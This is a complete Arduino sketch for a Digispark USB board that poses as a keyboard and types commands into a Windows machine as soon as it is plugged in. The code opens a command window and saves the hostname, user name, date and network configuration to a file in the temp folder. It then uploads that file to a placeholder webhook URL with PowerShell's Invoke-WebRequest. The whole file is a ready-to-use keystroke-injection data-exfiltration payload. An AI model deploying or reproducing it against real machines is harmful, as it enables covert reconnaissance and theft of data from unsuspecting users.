#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=100 lines=30"); //smallest cmd window possible
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(300);
  DigiKeyboard.println("cd %temp%"); //going to temporary dir
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell hostname;whoami;get-date;ipconfig > data_dump" ); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri WEB_HOOK_HERE -Method POST -InFile data_dump"); //Submitting to webhook
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(9000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}

void loop() {

}
